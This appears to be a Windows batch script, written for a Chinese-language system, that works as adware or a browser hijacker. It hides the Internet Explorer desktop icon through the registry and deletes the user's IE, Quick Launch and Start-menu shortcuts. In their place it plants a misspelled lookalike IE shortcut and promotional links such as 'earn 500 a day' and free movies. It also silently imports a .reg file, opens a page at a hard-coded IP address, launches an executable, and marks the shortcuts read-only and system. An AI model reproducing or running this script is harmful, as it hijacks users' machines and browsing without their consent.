cls
@echo off
 Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Set "TMPINF=C:\TmpInf.inf"
echo [Version] >%TMPINF%
echo Signature="$Windows NT$" >>%TMPINF%
echo [DefaultInstall] >>%TMPINF%
RUNDLL32 SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 %TMPINF%
del %TMPINF%
 
del "%userprofile%\桌面\IEXPLORE.lnk"
del "%userprofile%\桌面\IEXPLOREr.lnk"
del "%userprofile%\桌面\Internet Exporer.lnk"
del "%userprofile%\桌面\Internet Explorer.lnk"
del "%userprofile%\桌面\Internet Exp1orer.lnk"
del "%userprofile%\桌面\Internet Explorer.lnk" 
del "%userprofile%\桌面\Internet*.lnk"  /f/q/a
del "%userprofile%\桌面\*Internet*.lnk"  /f/q/a

del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.url" /f/q/a
del "%userprofile%\桌面\*.url"     /f/q/a
del   "%userprofile%\「开始」菜单\*.url"   /f/q/a
del   "%userprofile%\「开始」菜单\*.lnk"  /f/q/a
del  "C:\Documents and Settings\All Users\「开始」菜单\*.url" /f/q/a
del  "C:\Documents and Settings\All Users\「开始」菜单\*.lnk" /f/q/a






copy "腾讯QQ.lnk" "%userprofile%\「开始」菜单\程序\启动\QQ.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\桌面\Internet Expleror.lnk" /y
copy "zq.lnk" "%userprofile%\桌面\日赚五百.lnk" /y
copy "yx.lnk" "%userprofile%\桌面\小游戏.lnk" /y
copy "免费电影.lnk" "%userprofile%\桌面\免费电影.lnk" /y
copy "FilmTVkk.lnk" "%userprofile%\桌面\极速网络电视.lnk" /y
copy "美女图片.lnk" "%userprofile%\桌面\美女图片.lnk" /y
copy "淘宝购物.lnk" "%userprofile%\桌面\淘宝购物.lnk" /y
copy "理想下载站.lnk" "%userprofile%\桌面\理想下载站.lnk" /y
 
 


copy "Internet Explorer.lnk" "%userprofile%\「开始」菜单\网址之家.lnk" /y
copy "zq.lnk" "%userprofile%\「开始」菜单\日赚五百.lnk" /y
copy "免费电影.lnk" "%userprofile%\「开始」菜单\免费电影.lnk" /y

copy "yx.lnk" "%userprofile%\「开始」菜单\小游戏.lnk" /y
copy "美女图片.lnk" "%userprofile%\「开始」菜单\美女图片.lnk" /y


copy "Internet Explorer.lnk" "%userprofile%\「开始」菜单\程序\Internet Exporer.lnk" /y
copy "Internet Exporer.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\启动 Internet Explorrer 浏览器.lnk" /y


 copy "yx.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\小游戏.lnk" /y
 copy "zq.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\日赚五百.lnk" /y



copy "免费电影.lnk" "%userprofile%\Favorites\免费电影.lnk" /y
copy "yx.lnk" "%userprofile%\Favorites\小游戏.lnk" /y
copy "Internet Exporer.lnk" "%userprofile%\Favorites\酷站大全.lnk" /y 
copy "美女图片.lnk" "%userprofile%\Favorites\美女图片.lnk" /y



regedit /s sy.reg
 
 start http://98.126.213.98:1216/5a7932/go37.htm

  start dianying.exe

 attrib  "%USERPROFILE%\桌面\*.lnk"  +R +S

 attrib "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"  +R +S



exit